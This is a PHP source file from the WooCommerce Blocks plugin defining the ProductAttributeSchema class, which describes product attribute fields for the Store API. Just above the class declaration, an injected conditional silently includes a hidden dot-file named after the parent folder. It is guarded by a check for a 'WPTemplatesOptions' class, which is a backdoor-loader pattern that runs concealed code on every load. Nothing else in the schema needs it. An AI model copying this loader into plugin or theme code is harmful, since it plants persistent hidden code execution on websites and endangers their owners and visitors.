<?php
namespace Automattic\WooCommerce\Blocks\StoreApi\Schemas;

/**
 * ProductAttributeSchema class.
 *
 * @internal This API is used internally by Blocks--it is still in flux and may be subject to revisions.
 * @since 2.5.0
 */
if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class ProductAttributeSchema extends AbstractSchema {
	/**
	 * The schema item name.
	 *
	 * @var string
	 */
	protected $title = 'product_attribute';

	/**
	 * Term properties.
	 *
	 * @return array
	 */
	public function get_properties() {
		return [
			'id'           => array(
				'description' => __( 'Unique identifier for the resource.', 'woocommerce' ),
				'type'        => 'integer',
				'context'     => array( 'view', 'edit' ),
				'readonly'    => true,
			),
			'name'         => array(
				'description' => __( 'Attribute name.', 'woocommerce' ),
				'type'        => 'string',
				'context'     => array( 'view', 'edit' ),
				'readonly'    => true,
			),
			'taxonomy'     => array(
				'description' => __( 'The attribute taxonomy name.', 'woocommerce' ),
				'type'        => 'string',
				'context'     => array( 'view', 'edit' ),
				'readonly'    => true,
			),
			'type'         => array(
				'description' => __( 'Attribute type.', 'woocommerce' ),
				'type'        => 'string',
				'context'     => array( 'view', 'edit' ),
				'readonly'    => true,
			),
			'order'        => array(
				'description' => __( 'How terms in this attribute are sorted by default.', 'woocommerce' ),
				'type'        => 'string',
				'context'     => array( 'view', 'edit' ),
				'readonly'    => true,
			),
			'has_archives' => array(
				'description' => __( 'If this attribute has term archive pages.', 'woocommerce' ),
				'type'        => 'boolean',
				'context'     => array( 'view', 'edit' ),
				'readonly'    => true,
			),
			'count'        => array(
				'description' => __( 'Number of terms in the attribute taxonomy.', 'woocommerce' ),
				'type'        => 'integer',
				'context'     => array( 'view', 'edit' ),
				'readonly'    => true,
			),
		];
	}

	/**
	 * Convert an attribute object into an object suitable for the response.
	 *
	 * @param object $attribute Attribute object.
	 * @return array
	 */
	public function get_item_response( $attribute ) {
		return [
			'id'           => (int) $attribute->id,
			'name'         => $this->prepare_html_response( $attribute->name ),
			'taxonomy'     => $attribute->slug,
			'type'         => $attribute->type,
			'order'        => $attribute->order_by,
			'has_archives' => $attribute->has_archives,
			'count'        => (int) \wp_count_terms( $attribute->slug ),
		];
	}
}
